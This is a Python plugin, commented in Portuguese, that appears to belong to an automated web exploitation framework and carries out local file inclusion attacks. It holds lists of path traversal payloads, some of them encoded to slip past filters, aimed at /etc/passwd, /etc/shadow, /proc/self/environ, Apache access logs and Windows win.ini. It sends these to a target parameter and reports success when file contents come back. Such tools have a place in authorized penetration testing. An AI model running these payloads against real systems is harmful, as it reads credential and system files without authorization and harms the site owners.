"""
LfiPipeline — Pipeline de exploração de Local File Inclusion (Fase 3)

Tenta ler arquivos sensíveis do sistema usando traversal sequences.
Detecta inclusão confirmada por:
1. Conteúdo característico de /etc/passwd (root:x:0:0)
2. Conteúdo de arquivos Windows (win.ini, [boot loader])
3. Reflexo de conteúdo de arquivo de log ou config
"""

from __future__ import annotations

import re
from typing import List, Tuple

from core.models import QueueItem
from plugins.pipelines import BasePipeline, _HttpResult, _http_send


_PAYLOADS_UNIX = [
    "../../../../etc/passwd",
    "../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../var/log/apache2/access.log",
]

_PAYLOADS_UNIX_ENCODED = [
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
]

_PAYLOADS_WINDOWS = [
    "..\\..\\..\\windows\\win.ini",
    "../../../../windows/win.ini",
    "C:\\Windows\\win.ini",
    "../../../../boot.ini",
]

_UNIX_INDICATORS = ["root:x:0:0", "daemon:", "bin/bash", "bin/sh", "/home/"]
_WIN_INDICATORS = ["[fonts]", "[extensions]", "[mci extensions]", "[boot loader]"]


class LfiPipeline(BasePipeline):
    name = "LfiPipeline"
    MAX_ATTEMPTS = 7

    def _get_payloads(self, item: QueueItem) -> List[str]:
        return _PAYLOADS_UNIX + _PAYLOADS_UNIX_ENCODED + _PAYLOADS_WINDOWS

    def _execute(self, item: QueueItem, payload: str) -> Tuple[str, _HttpResult]:
        url = item.endpoint or item.target
        param = item.parameter

        if item.method.upper() == "POST":
            return _http_send(url, method="POST",
                              data={param: payload} if param else {"file": payload})
        else:
            params = {param: payload} if param else {"file": payload}
            return _http_send(url, method="GET", params=params)

    def _verify(self, result: _HttpResult, payload: str, item: QueueItem) -> str:
        if result.status == 0:
            return "failed"

        body = result.body

        # Conteúdo de arquivo Unix
        for indicator in _UNIX_INDICATORS:
            if indicator in body:
                return "impact_proven"

        # Conteúdo de arquivo Windows
        for indicator in _WIN_INDICATORS:
            if indicator.lower() in body.lower():
                return "impact_proven"

        # Traversal potencial: resposta diferente mas sem conteúdo confirmado
        if result.status == 200 and len(body) > 200:
            # Possível inclusão sem indicadores claros
            if "../" in payload or "..%2F" in payload.lower():
                return "partial"

        # Erro de PHP revelando path traversal → parcial
        if re.search(r"(Warning|include|require).*\.\.", body, re.IGNORECASE):
            return "partial"

        return "failed"
